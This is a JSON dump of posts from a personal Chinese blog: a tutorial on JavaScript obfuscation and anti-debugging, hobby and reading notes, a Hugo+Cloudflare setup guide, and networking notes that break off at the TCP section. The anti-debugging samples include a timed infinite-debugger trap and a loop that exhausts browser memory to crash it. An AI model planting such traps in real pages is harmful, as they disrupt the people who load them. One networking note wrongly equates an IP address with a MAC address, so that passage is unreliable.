[{"categories":null,"contents":"JavaScript 混淆（Obfuscation）是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。JS最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。\n压缩工具开发的初衷是减小 JS 文件体积，但 JS 代码经过压缩替换后，其可读性也大大降低，间接起到了保护代码的作用。但是后来主流浏览器的开发者工具都提供了格式化代码的功能，压缩技术所能提供的安全保护收效甚微。于是专门保护 JS 代码的技术：JS 加密和 JS 混淆。\n常见混淆手段 变量名/函数名的替换，将有意义的变量名函数名替换为随机生成的名称\n/*\rfunction calculateArea(radius) {\rreturn Math.PI * radius * radius;\r}\rconsole.log(calculateArea(5));\r*/\rfunction _0x2d8f05(_0x4b083b) {\rreturn Math.PI * _0x4b083b * _0x4b083b;\r}\rconsole.log(_0x2d8f05(5)); 字符串混淆，将代码中的字符串替换为编码或加密的形式，可以防止字符串被轻易读取。\n// console.log(\u0026#34;Hello, world!\u0026#34;);\rconsole.log(\u0026#34;\\x48\\x65\\x6c\\x6c\\x6f\\x2c\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21\u0026#34;); 控制流混淆，改变代码的执行顺序或结构。例如，可以使用条件语句和循环语句来替换简单的赋值操作。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rlet c;\rif (a === 1) {\rif (b === 2) {\rc = a + b;\r}\r}\rconsole.log(c); 花指令，即在源码插入一些不会被执行的代码。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rif (false) {\rconsole.log(a - b);\r}\rlet c = a + b;\rconsole.log(c); 代码转换，将代码转换为等价的，但更难理解的形式。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rlet c = a - (-b);\rconsole.log(c); 常见反调试手段 实现防止他人调试、动态分析自己的代码，我们可以预先在代码中做处理，防止用户调试代码。\n无限 debugger。比如写个定时器死循环禁止调试。\nvar c = new RegExp(\u0026#34;1\u0026#34;);\rc.toString = function () {\ralert(\u0026#34;检测到调试\u0026#34;)\rsetInterval(function() {\rdebugger\r}, 1000);\r}\rconsole.log(c); 内存耗尽。更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。\nvar startTime = new Date();\rdebugger;\rvar endTime = new Date();\rvar isDev = endTime - startTime \u0026gt; 100;\rvar stack = [];\rif (isDev) {\rwhile (true) {\rstack.push(this);\rconsole.log(stack.length, this);\r}\r} 检测函数、对象属性修改。攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。\nfunction eval() {\r[native code]\r}\rwindow.eval = function(str) {\rconsole.log(\u0026#34;[native code]\u0026#34;);\r};\rwindow.eval = function(str) {\r};\rwindow.eval.toString = function() {\rreturn `function eval() {[native code]}`\r};\rfunction hijacked(fun) {\rreturn \u0026#34;prototype\u0026#34; in fun || fun.toString().replace(/\\n|\\s/g, \u0026#34;\u0026#34;) != \u0026#34;function\u0026#34; + fun.name + \u0026#34;() {[nativecode]}\u0026#34;;\r} 在线混淆工具 反混淆 JS 反混淆（Deobfuscator ）是指对经过混淆处理的代码进行还原和解析，以恢复其可读性。Deobfuscator 可以通过对代码进行静态分析和动态分析等方式来实现。需要注意的是，Obfuscation 只能降低可读性，不能完全避免逆向攻击，而 Deobfuscator 也并不能完全还原混淆过的代码。\n在线反混淆工具 以及浏览器前端中的Source窗口，配合console.log（）函数非常好用。\n目前的需求是，一段经过混淆的恶意代码，能否直接在前端执行出解混淆后的结果。目前认知来看只有编码类混淆可以，而且存在执行到C2的风险。\n","date":"2024-07-05T15:35:25+08:00","permalink":"https://wander1ng.com/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/","section":"post","tags":["Meta"],"title":"常见JavaScript混淆与反混淆"},{"categories":null,"contents":"二〇二四 六月 海南 碧海青天夜夜心\n","date":"2024-07-05T11:28:56+08:00","permalink":"https://wander1ng.com/post/%E6%91%84%E5%BD%B1%E4%BD%9C%E5%93%81%E5%B0%8F%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/","section":"post","tags":["摄影"],"title":"摄影作品小记(持续更新中)"},{"categories":null,"contents":"岑樱\n北洛\n乌衣国\n神话中的燕子之国。宋张敦颐《六朝事迹．乌衣巷》:\u0026ldquo;王榭，金陵人，世以航海为业。一日，海中失船，泛一木登岸，见一翁一妪皆衣皂，引榭至所居，乃乌衣国也。以女妻之，既久，榭思归，复乘云轩泛海至其家，有二燕栖于梁上……来春，燕又飞来榭身上，有诗云:\u0026lsquo;昔日相逢冥数合，如今暌远是生离。来春纵有相思字，三月天南无雁飞。\u0026rsquo;\u0026ldquo;宋戴复古《燕》诗:\u0026ldquo;闻说乌衣国，低连海上村。\u0026ldquo;金庞铸《田器之燕子图》诗:\u0026ldquo;乌衣之国定何许，一双燕子能飞来。\u0026ldquo;后因以之为男女结合之地的典实。\n","date":"2024-07-05T11:26:32+08:00","permalink":"https://wander1ng.com/post/%E5%8F%A4%E5%89%91%E5%A5%87%E8%B0%AD%E4%B8%89%E5%B0%8F%E8%AE%B0/","section":"post","tags":["游戏"],"title":"《古剑奇谭三》小记(持续更新中)"},{"categories":null,"contents":"Cybersecurity Researcher(Focusing on Advanced Persistent Threat)\nInterest: Reading | Photography | Travel | Wander | Cooking\nWeChat ID: WanderingtotheMoon (どうぞよろしくお願いいたします)\n[不要温和地走进那个良夜]——Dylan Thomas\n[我与我周旋久 宁作我]——《世说新语》\n[去爱去生活去受伤]——《我的阿勒泰》\n[A rolling stone gathers no moss]——Publiius Syrus\n[湖中焉得更有此人！]——张岱\n[身体为了繁衍留下后代，精神为了繁衍留下文字。]——我自己\n[阅读只是在被动接受，你读过什么并不代表你是什么。书写才能定义自我，你所写下的就是你自己。]——我自己\n","date":"2024-07-04T22:02:31+08:00","permalink":"https://wander1ng.com/about/","section":"","tags":["Meta"],"title":"About"},{"categories":null,"contents":"二〇二四年|七月 正在看\n《眷思量》\n《人间世》\n《边走边唱的女子》\n《是的首相》\n《权力的游戏》\n","date":"2024-07-03T10:28:44+08:00","permalink":"https://wander1ng.com/post/%E5%BE%85%E7%9C%8B%E7%94%B5%E5%BD%B1%E5%8F%8A%E5%89%A7%E9%9B%86%E5%B0%8F%E8%AE%B0/","section":"post","tags":["Film"],"title":"待看电影及剧集小记"},{"categories":null,"contents":"二〇二四年|七月 正在玩\n《古剑奇谭三》\n《烟火》\n《赛博朋克2077》\n《文明6》\n《荒野大镖客2：救赎》\n期待ing\n《黑神话：悟空》\n","date":"2024-07-03T10:27:42+08:00","permalink":"https://wander1ng.com/post/%E5%BE%85%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%B0%8F%E8%AE%B0/","section":"post","tags":["游戏"],"title":"待玩游戏小记"},{"categories":null,"contents":"二〇二四年|七月 《莱博维茨的赞歌》for科幻读书会\n​\t“站住别动！”老头儿用嘶哑的声音吼道，“离我远点儿，你这怪物！我这里没有你要的东西！这里有奶酪，你可以拿走。想要肉的话，除了这把老骨头，我什么都没有。你要敢动，我就和你拼个鱼死网破！滚开！快滚！” “等等——”修士刚说两个字就住了口。只有出于行善或礼貌才可以打破斋节期间禁言的规矩，情势所迫也能得到谅解，但主动打破沉默还是让修士有些紧张。 ​\t“我并非怪物，善良的蠢货。”修士用表示礼貌的称呼接着说道。他褪下了兜帽，露出修士发式，抬起手中的念珠：“这下您明白了吧？” ​\t沉寂持续了几秒钟，老人一边像猫一样保持警惕，随时准备以命相搏，一边细细打量修士被晒出水疱的稚嫩脸颊——尽管他自己的老脸才是个天生的错误。沙漠边缘到处游荡着怪物，他们常常戴着兜帽、面具或穿着宽松的长袍来掩盖身体的缺陷。他们的畸形不仅限于身体，有的怪物甚至会把旅行者当作可以赖以为生的野味。\n​\t尽管弗朗西斯因为摄水量不足而导致身体脱水，可一见到食物，口腔里一下子涌上了唾液。修士的目光被这递食物的手牢牢吸引住了，无法移开。刹那间，宇宙收缩了，悬浮不定的宇宙中心就在于这沾满沙土的珍馐——黑面包和白奶酪。\n《永恒的终结》for科幻读书会\n《平面国》for科幻读书会\n《与罗摩相会》for科幻读书会\n《刘擎现代西方思想讲义》\n​\t着眼于分析、诊断和反思，什么样的思想观念塑造了现代社会的行动逻辑，构成了现代世界的复杂性。\n《这就是ChatGPT》\n​\tGPT的主要思路是通过生成获取世界模型的压缩表示——Ilya Sutskever\n​\t产生“有意义的人类语言”需要什么？过去，我们可能认为人类大脑必不可少。但现在我们知道，ChatGPT的神经网络也可以做得非常出色……我强烈怀疑ChatGPT的成功暗示了一个重要的“科学”事实：有意义的人类语言实际上比我们所知道的更加结构化、更加简单，最终可能以相当简单的规则来描述如何组织这样的语言。 ​\t语言是严肃思考、决策和沟通的工具。从孩子的成长过程来看，相比感知、行动，语言应该是智能中更难的任务。但ChatGPT很可能已经攻破了其中的密码，正如Wolfram说的“它也在某种意义上‘钻研’到了，不必考虑可能的不同措辞，就能‘以语义上有意义的方式组织语言’的地步”。这确实预示着未来我们通过计算语言或者其他表示方式，有可能进一步大幅提升整体的智能水平。\n《艺术的力量》\n​\t伟大的艺术都有令人不悦的方面。美术馆中的安静肃穆可以欺骗你，令你相信杰出的艺术作品都是礼貌友好的事物，是抚慰人心、令人陶醉、引人入胜的图景，但是它们其实都是暴徒。无情，狡诈，最伟大的绘画作品简直是要一把按住你的脑袋，将你的沉着镇定彻底击碎，然后立刻开始重组你对真实世界的感知。\n《我还能看到多少次满月升起》\n​\t因为不知死何时将至，我们仍将生命视为无穷无尽、取之不竭的源泉。然而，一生所遇之事也许就只发生那么几次。曾经左右过我们人生的童年回忆浮现在心头的时刻还能有多少次呢？也许还能有四五次。目睹满月升起的时刻又还能有多少次呢？或许最多还能有二十次。但人们总是深信这些机会将无穷无尽。\n《念念远山》\n《席德梅尔的回忆录》\n翦商\n古国时代：辽河文明、黄河文明、长江文明;\n辽河文明主要是红山文化牛河梁遗址;黄河文明主要是仰韶文化、大汶口文化、龙山文化、陶寺遗址、石峁遗址;长江文明主要是凌家滩文化、良渚文化、三星堆遗址;\n杀祭地点在戍嗣子的家宅或附近，操办和参加祭礼的是商朝贵族，给了死者一点宽待，但仍按照惯例烹食了很多被献祭的人，尤其是婴儿和幼儿。\n罗马人后来皈依了基督教，传统的阿兹特克宗教被西班牙殖民者的天主教所取代，殷商则与之不同：周灭商后，人祭被周人消除，但周人并未开创一种新的宗教，而是采用世俗的人文主义立场，与极端宗教行为保持距离，不允许其干预现实生活，所谓“敬鬼神而远之”。这奠定了后世中国的文化基础。\n人祭主要表现为以下三种形式： 一，把人夯筑在地基内，用作建筑物的奠基，可称之为“人奠基”。其原理可能是把人奉献给土地之神，用以交换神对建筑物的护佑，以及通过施展巫术，被杀者可能也会变成守护建筑之鬼。 二，把人作为食物或仆役献祭给神或祖先之灵，这是狭义的“人祭”。 三，把人作为殉葬品埋在主人的墓穴内，可称之为“人殉”。其原理可能是当时的人们认为尊贵的人在死后会变为神灵，所以在去往神界的旅途中要给他（她）带上一些仆役和食物。\n","date":"2024-07-03T10:20:30+08:00","permalink":"https://wander1ng.com/post/%E5%BE%85%E8%AF%BB%E4%B9%A6%E7%B1%8D%E5%B0%8F%E8%AE%B0/","section":"post","tags":["Reading"],"title":"待读书籍小记"},{"categories":null,"contents":"《格子间的生与死：当我们厌恶工作》是语雀公众号推送的一篇文章，部分观点挺触动我的，贴上链接\nhttps://mp.weixin.qq.com/s/6UxbWnE04wOpv56Ub0p7xw\n作者主要分成了两个方面，一方面是解构当下大部分人工作感到痛苦的原因：a)从精神层面来说，高薪越来越难以带来快乐。b)从身体层面来说，空间桎梏让人孤独。随后在另一方面尝试提出了解决办法：a)表达，阅读，解明，构建。b)将金钱价值具象化。c)建立分布式的情感系统。d)把工作作为手段而非目的。\n作者把高薪越来越难带来快乐归纳为三个原因\n金钱边际效应的递减； 长期主义的神话逐渐成为谎言； 金钱锚定物的缺失； 金钱边际效应的递减，当一个人存款从零到十万时，带来的快是最大的。而从十万到二十万、从二十万到四十万，数字的变化带来的快乐已经很小了。这方面我已经感受到了，还记得第一次拿到正式工资时的快乐，到账的不是钱而是闪闪发光的自由，以及社会对自身价值的认可。如今和同事调侃起工资，一般都称作窝囊费。\n长期主义的神话逐渐成为谎言，结合这两天中金公司30岁女生跳楼的新闻，不免想起那句时代的一粒沙，落到普通人头上就是一座山。父母的25岁，正好赶上改革开放，人生像是被一阵风托举着。我的25岁，经历过疫情+经济下行，底色中已经掺杂上了焦虑，以及对这个社会/政党的失望。草东没有派对是一支台湾摇滚乐队，在网易云的粉丝量为180万。而五月天这种人尽皆知的老牌乐队，粉丝量也才324万。《烂泥》《大风吹》都代表了Z时代丧、消极的精神状态，偏离主流叙事，不再相信公平与奋斗，自然也就不再相信长期主义。\n金钱锚定物的缺失，这一点我并没有感觉到，可能是做到了解决办法中的将金钱具象化。作者的这一点想法其实和关于边际效应的一点相似，单纯的增加的钱变成了无法感受的事物\n工作耗尽了一个人绝大部分的神经力量，而这些力量原本是可以用来沉思、冥想、做梦、担忧、去爱、去恨的。——尼采\n当欲望也被工作耗尽，金钱便不再与快乐锚定，只会成为变化的数字。\n空间的桎梏让人孤独，表现为大部分(互联网)打工人难以拥有wlb的生活，去构建/维护爱情、友情等亲密关系。我自己也有个观点，实际的上班并不是身处公司的时间与空间限制，也包括在这份工作上付出的焦虑、疲劳等情绪价值。设想两个人的工作时间都是8小时，A是无所事事的8小时，B是身心俱疲的8小时，那么B可能在下班后还要花2小时修复自我，那么他实际的上班时间是10小时。所以有些时候指责他人因为懒而不去做什么是不对的，你不知道他在消耗了一天之后是否还有精力去做自己的事。No judge是一种美德，尊重他人选择。与此同时在格子间内进行社交，一方面同事之间当作朋友处被定义成了职场大忌（虽然我很幸运遇到了一批关系不错的同届校招同事），另一方面年龄差距、性别差异带来的代沟无法忽视。\n人是社会关系的总和，过长的工作时间挤占了人类社交空间的同时，也削减了人类定义自我的能力。\n随后作者提出了可能的解决办法：\na)表达，阅读，解明，构建\n表达是将自己的愤怒与焦虑释放，即便我们不是最受压迫、最痛苦的那批人，我们也有权力发表自己的感受。随后通过阅读尝试用他人的理论来构建自己关于工作的观念。这里作者提出了大卫·格雷伯在《毫无意义的工作》一书中的观念：身为原因的快感。\n人类之所以觉得自己是自主存在，是与世界和他人分离的独立体，很大程度上是因为人们觉得自己可以按照可预测的方式对世界和他人产生影响。一旦被剥夺这种拥有力量的感觉，人类就什么也不是了。\n这种对世界和他人的影响带来的愉悦心情被称之为“身为原因的快感”，也被认为是一种对自由本身的实践。\nb)重新挖掘将金钱价值具象化的方法\n目前我倒是挖掘得挺好的，以至于工作两年还是没存下多少钱\u0026hellip;其实就是让自己的欲望生长出来，五十块可以去电影院看一场电影，两百块可以和朋友吃一顿热热闹闹的火锅，三百块可以去剧院看一场戏剧。\nc)建立分布式的情感支撑系统，这一点对我的触动特别大。人是社会关系的总和，需要友情、亲情、爱情\u0026hellip;建立分布式的情感支撑系统而非集中式的，意思就是不要把某个东西放得太重。\n《安娜·卡列尼娜》中有一段剧情（我不久前看过此书，却完全没体会到）\n“他对安娜的迷恋彻底消除了他同别人亲密交往的需求。现在，他在所有的熟人中间没有一个知心朋友。……在彼得堡的熟人中间，最亲密、最谈得来的是他的办公室主任和医生。办公室主任史留丁是个朴实、聪明、善良和有道德的人，卡列宁对他很有好感，但是五年来的同事关系在他们之间形成了一道鸿沟，妨碍他们推心置腹地交谈。”\n卡列宁对安娜的迷恋彻底消除了他同别人亲密交往的需求，以至于当他生活发生巨变的时候无人可倾诉。有趣的是，在书中，安娜和另一位角色列文在人格和灵魂上如此相似（情感丰富而热烈），但是最后却又拥有截然不同的结局：列文在失意时，可以和农民们一起干农活、可以写书、可以参与政治，可是安娜却只能紧紧抓住伏伦斯基，从而走向悲剧。不只是爱情，还有亲情、友情、工作、爱好以及一切。毕竟，离别是人生的永恒主题之一。\n其次，尝试去做一个自私的好人。即使是出于一种自私的目的\u0026quot;让自己感觉好点\u0026quot;，去关爱他人也是一件值得去做的事。让我想起了某位朋友，尝试将自己”溢出“的幸福分给他人。\nd)将工作当成达成目的的手段而非目的本身。\n作者认为当实在无法从工作者获得意义的时候，或许正确的应对手段，是放弃把工作作为目的本身，而是把它作为一种达成目的的手段，获得资金和人脉的积累，获得经验，为了某一天去做自己真正想做的事。\n目前我对于自己的工作还是有一点小小的成就感，所以暂时无法认同。虽然有时这种成就感不能持续，也还没有将其作为毕生的事业，但一直在努力探索发散出自己的应许之地。\n","date":"2024-07-01T23:43:17+08:00","permalink":"https://wander1ng.com/post/%E6%A0%BC%E5%AD%90%E9%97%B4%E7%9A%84%E7%94%9F%E4%B8%8E%E6%AD%BB%E5%BD%93%E6%88%91%E4%BB%AC%E5%8E%8C%E6%81%B6%E5%B7%A5%E4%BD%9C%E6%9C%AD%E8%AE%B0/","section":"post","tags":["Reading"],"title":"《格子间的生与死：当我们厌恶工作》小记"},{"categories":null,"contents":"1.首先创建Github库\n2.安装hugo：\nhttps://github.com/gohugoio/hugo/releases 3.下载后记得将hugo.exe路径加入系统环境变量，测试是否安装成功：\nhugo version 4.使用hugo创建博客目录\nhugo new site blogname 5.在系统中创建博客目录，并git init，配置好git的config文件。\n6.选择hugo主题，并使用git clone将主题下载到本地，本网站选择的主题是https://github.com/heyeshuang/hugo-theme-tokiwa.git，第一眼看到便想到莫奈的《日出·印象》。\n7.新建文章\nhugo new post/first-post.md\n8.在hugo网站的根目录下执行hugo进行编译，启动本地预览,打开网址 http://localhost:1313/ 可以进行预览hugo server -D\n9.部署到GitHub\ngit add .\rgit commit -m \u0026#34;xxx\u0026#34;\rgit push https://github.com/username/projectname master(main) 10.在Godaddy或其他网站购买域名\n11.将域名托管到Cloudflare，左边导航栏进入Websites\nadd site\n记得选free plan\n随后在Godaddy设置域名DNS为Cloudflare的DNS服务器地址\n随后等待DNS解析成功，邮箱将会收到邮件通知\n在Cloudflare创建pages并连接到Git，选择最开始在Git中新建的blog目录\n随后博客文件将部署到Cloudflare上\n最后自定义域名，即将域名DNS记录指向Pages\n踩的坑\nHugo server -D的意思是忽略draft=true，即draft属性为true的md文件也会被渲染编译。折磨了一天的问题是“为什么本地能够编译出文章，但是部署到Github上就消失了？”因为实际部署的时候draft=true的文件是不显示的。\n域名的CNAME要解析到项目的别名/Aliases，一键交给Cloudflare添加的CNAME可能不是实际的Aliases，需要手动修改DNS添加上master。\n","date":"2024-06-27T18:02:59+08:00","permalink":"https://wander1ng.com/post/hugo+cloudflare%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97/","section":"post","tags":["技术"],"title":"Hugo+CloudFlare搭建博客指南"},{"categories":null,"contents":"学计网的时候有些头大,找到了这篇文章,首先对整体有一个认识,再换一本书,机械工业出版社的《Computer Networking A Top-Down Approach》.\n序 互联网的核心是一系列协议,总称为互联网协议:Internet Protocol Suite.它们对电脑如何连接和组网,做出了详尽的规定.理解了这些协议的规定,就理解了互联网的原理.\n概述 五层模型 自顶向下分别为应用层Application Layer,传输层Transport Layer,网络层Network Layer,链路层Link Layer和物理层Physical Layer.越下面的层越靠近硬件,越上面的层越靠近用户.\n层与协议 每一层都是为了完成某一种功能,为了实现这些功能就要传输时遵循共同的规则protocol.互联网的每一层都定义了很多协议,这些协议的总称为互联网协议.\n物理层 电脑要组网,首先就要先把电脑连接起来,可以用光缆,线缆,双绞线和无线电波等方式(咋和谢希仁版有点不一样?还是我记错了).这就叫做物理层.它主要规定了网络的一些电气特性,作用是负责传输0和1的电信号.\n链路层 定义 单纯的0和1并没有意义,必须规定其解读方式:多少个电信号算一组,每个信号有何意义?链路层的功能就是在实体层的上方确定0和1的分组方式.\n以太网协议 Ethernet规定,一组电信号构成一个数据包叫做帧(Frame).每一帧分为两个部分:标头Head与数据Data.Head包含数据包的一些说明项,如发送者,接收者,数据类型.数据则是数据包的具体内容.\n标头的长度固定为18字节,数据的长度最短为46字节,最长为1500字节.因此对于一帧来说,大小区间为64-1518字节.数据过长则分为多个帧发送.\nMAC地址 传输数据的过程中要标识发送者与接收者,就要使用到MAC地址.Ethernet规定连入网络的所有设备都必须有网卡接口,**数据包必须是从一块网卡传送到另一块网卡.网卡的地址就是数据包的发送地址与接收地址即MAC地址.**每块网卡出场时都有一个唯一的MAC地址,长度为48个二进制位,常用12个16进制数表示.前6个位厂商编号,后六个为该厂商网卡流水号.\n广播 一块网卡要知道另一块网卡的MAC地址,要使用到ARP协议(在谢希仁版中自学过,现在又给忘了\u0026hellip;);\n知道MAC地址之后,系统怎样才能把数据包准确送到接收方?**Ethernet并不把数据包准确送到接收方,而是向本网络所有计算机发送,让计算机自己判断是否为接收方.**而向本网络所有计算机发包的行为,就叫做广播broadcasting.\n网络层 网络层的由来 根据Ethernet协议,依靠MAC地址发送数据,理论上和技术上世界上任何一个地方的网卡都能够找到任何一个地方的网卡.但是这样做有一个巨大的缺点\u0026quot;以太网采用广播的方式发送数据包,每个成员都会收到所有的包.不仅效率低,而且只能在发送者的子网络中传播.(如果互联网上每一台计算机都收到所有的包不可想象).\n所以必须找到一种方法,能够区分MAC地址是否属于一个子网络.如果属于一个子网络,采用广播的形式发送,否则采用路由(路由即向不同的子网络分发数据包).而MAC地址只与厂商有关与网络无关,所以网络层诞生了.\n它的作用是引进一套新的地址,使我们能够区分不同的计算机是否属于一个子网络.\n于是网络层出现后,每台计算机就有了两种地址,一种是MAC地址,另一种是网络地址(二者之间无任何联系).网络地址帮助我们确定计算机所在的子网络,MAC地址则将数据包送到该子网络的目标网卡.所以从逻辑上看一定是先处理网络地址,再处理MAC地址.\nIP协议 根据网络地址的协议就叫做IP协议,其定义的地址就叫做IP地址.IP地址由网络号和主机号组成.处于一个子网络的电脑,其IP地址的网络部分必定是相同的.主机部分是对同处该子网的主机进行编号.\n为了从IP地址判断出两台计算机是否处于同一个子网,就要用到另一个参数\u0026quot;子网掩码\u0026ldquo;即subnet mask.子网掩码使表示子网特征的一个参数,在形式上等同于IP地址,也是一个32位二进制数字.其网络部分全为1,主机部分全为0.\n知道IP地址与子网掩码判断是否属于同一个子网的方法:将两个IP地址分别于子网掩码进行AND运算,结果相同则在一个子网.\n已知IP地址172.16.154.1和172.16.254.233子网掩码都是255.255.255.0,请问其是否在一个子网?\n总结IP协议的作用:一是为每台计算机分配IP地址,另一个是为确定哪些地址处于一个子网.\nIP数据报 根据IP协议发送的数据,就叫做IP数据报.但是Ethernet数据报只包含MAC地址,并没有IP地址的栏位,是否要修改数据报定义,再添加一个栏位?回答是不需要,因为可以直接将IP数据报放进Ethernet数据报的数据部分.这就是互联网分层结构的好处:上层变动完全不涉及下层结构.\nIP数据报的标头(特指不在Head中而在Data中的关于IP信息的Head)长度一般在20-60字节,整个数据报的长度最大为65535字节.Ethernet数据报的数据部分,最长只有1500字节,所以如果IP数据报超过了1500字节,就要分割成几个Ethernet数据报分开发送.\nARP协议 IP数据报是放在以太网数据报里发送的.所以必须同时知道两个地址,一个是对方的MAC地址,一个是对方的IP地址.通常情况下对方的IP地址是已知的,但是MAC地址未知.所以需要一种基址从IP地址得到MAC地址.\n第一种情况,两个主机不在一个子网,则事实上无法得到对方的MAC地址,只能将数据包传送到两个子网连接处的网关,让网关进行处理.\n第二种情况,两个主机在一个子网,则使用ARP协议.ARP协议发出一个数据报,其中包含所要查询的IP地址,在对方的MAC地址这一栏,填的是FF:FF:FF:FF:FF:FF,表示这是一个广播地址.他所在的子网络的每一台主机,都会收到这个数据报.从中取出IP地址,与自身IP地址进行比较,如果两者相同,则做出回复向对方报告MAC地址,否则就丢弃这个包.\n传输层 有了MAC地址和IP地址,就可以在互联网上任意两台主机建立通信.但是同一台主机上有许多程序都要使用到网络,那么就需要一个参数来表示这个数据包到底供哪个进程使用,这个参数就叫做端口.它其实是每一个使用网卡的程序的编号,每个数据报都发送到主机的特定端口,这样不同的程序就能够取到自己所需要的数据.\n端口是0到65535之间的一个整数,正好16个二进制位.0到1023的端口被系统占用,用户只能选择大于1023的端口.\n传输层的功能是建立端口到端口之间的通信,相比之下网络层是建立主机到主机之间的通信.只要确定主机和端口,就能实现程序之间的交流.因此Unix就把主机+端口,叫做\u0026quot;套接字\u0026quot;socket.\nUDP协议 现在我们要在数据报中加入端口信息,这就需要新的协议.最简单的实现叫做UDP协议,它的格式就是在数据前面加上端口号.\nHead部分主要定义了发出端口与接收接口,其数据报非常简单,Head部分8个字节,总长度不超过65535字节,正好放进一个IP数据报.数据部分就是具体的内容然后把整个UDP数据报放入IP数据报的数据部分.所以整个Ethernet数据报变成了下面这样:\nTCP协议 UDP协议的优点在于比较简单,容易实现.但是缺点在于一旦数据报发出,无法知道对方是否知道.为了提高网络可靠性,TCP协议就诞生了.这个协议非常复杂,但可以近似认为它是有确认机制的.因此TCP协议能够确保数据不会丢失,但是实现困难,资源消耗较多.\nTCP数据报和UDP数据报一样,都是内嵌在IP数据报的数据部分.TCP数据报没有长度限制,理论上可以无限长.但是为了保证网络的效率,通常TCP数据报的长度不会超过IP数据报的长度,确保单个TCP数据报不必再被分割.\n应用层 应用程序收到传输层的数据,接下来就要进行解读.由于互联网是开放架构,所以必须先规定好格式.**应用层的作用,就是规定应用程序的数据格式.**举例来说,TCP协议可以为各种各样的程序传递数据,Email/WWW/FTP等,必须有不同协议规定电子邮电,网页和FTP数据的格式,这些应用程序协议就构成了应用层.这是最高的一层,直接面对用户.其数据就在TCP数据报的数据部分,因此现在的Ethernet变成了下面这样:\n网络通信的实质就是交换上面的数据报.\n对于不在一个子网的两台计算机之间的通信(假设1号电脑要向4号电脑发送数据报),则1号电脑需要知道网关A的MAC地址(和4号电脑的IP地址).1号电脑发出数据报到网关A,网关A通过路由协议发现4号电脑位于网络B,又把数据报发给网关B,B再转发到4号电脑.\n判断是否处于同一子网的方法 静态IP地址 本机IP地址,子网掩码,网关IP地址,DNS的IP地址是TCP/IP协议的重要参数,通俗来说知道它们就可以上网.由于它们是给定的,计算机每次开机都分配到相同的IP地址,所以这种方法被称作静态IP地址上网.\n但是出于简便性,并且避免IP地址无法灵活变更,大多数用户使用\u0026quot;动态IP上网\u0026rdquo;.\n动态IP地址 计算机开机后会自动分配到一个IP地址,不用人为设定,它们使用的协议叫做DHCP协议.该协议规定每个子网中都有一台计算机负责管理本网络的所有IP地址,叫做DHCP服务器.新的计算机加入网络,必须向DHCP服务器发送一个DHCP请求数据报,申请IP地址和相关的网络参数.(指定管理IP地址的DHCP服务器未开机怎么办????)\n新加入的计算机不知道不同子网计算机的MAC地址和IP地址,如何发送数据报?DHCP协议作出了巧妙规定:\n由于DHCP是一种建立在UDP协议基础上的应用层协议,所以整个数据报长这个样子:\n最前面的Ethernet Head,设置发出方的MAC地址和接收方(DHCP服务器)的MAC地址,前者就是本机网卡的MAC地址,后者此时不知道,填入广播地址FF:FF:FF:FF\n后面的IP Head,设置发出方的IP地址和接收方的IP地址,这时对于这两者本机都不知道,于是发出方的IP地址设为0.0.0.0,接收方IP地址设为255.255.255.255\n最后的UDP Head,设置发出方的端口和接收方的端口.DHCP协议规定发出方是port 68,接收方是port 67.\n这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道”这个包是发给我的”，而其他计算机就可以丢弃这个包。\n接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个”DHCP响应”数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。\n实例 假设网络参数如下:\n本机IP:192.168.1.100,子网掩码255.255.255.0,网关IP:192.168.1.1,DNS的IP地址:8.8.8.8\n然后打开了Google Chrome,输入了www.google.com,接下来浏览器将要向Google发送一个网页请求数据报.\nDNS协议 发送数据报就要知道对方的IP地址,我么可以通过DNS协议将网址转换为IP地址.已知DNS服务器为8.8.8.8,于是向其发送DNS数据报(port 53):\n之后DNS服务器做出响应,告诉我们Google服务器的IP地址172.194.72.105.\n子网掩码 得到IP地址后要通过子网掩码来判断改IP是否在同一个子网,以确定要不要向网关发包.将子网掩码与自己的IP地址和Google的IP地址进行AND运算,发现结果不相等,所以不在一个子网.所以我们要向Google发送数据报,必须通过网关192.168.1.1转发,也就是说接收方的IP地址将是网关的MAC地址.\n应用层协议 浏览网页用到的是HTTP协议,它的数据报长下面这个样子:\nGET / HTTP/1.1 Host: www.google.com Connection: keep-alive User-Agent: Mozilla/5.0 (Windows NT 6.1) …… Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Encoding: gzip,deflate,sdch Accept-Language: zh-CN,zh;q=0.8 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 Cookie: … …\n被嵌在TCP数据报之中,假定为4960字节.\nTCP协议 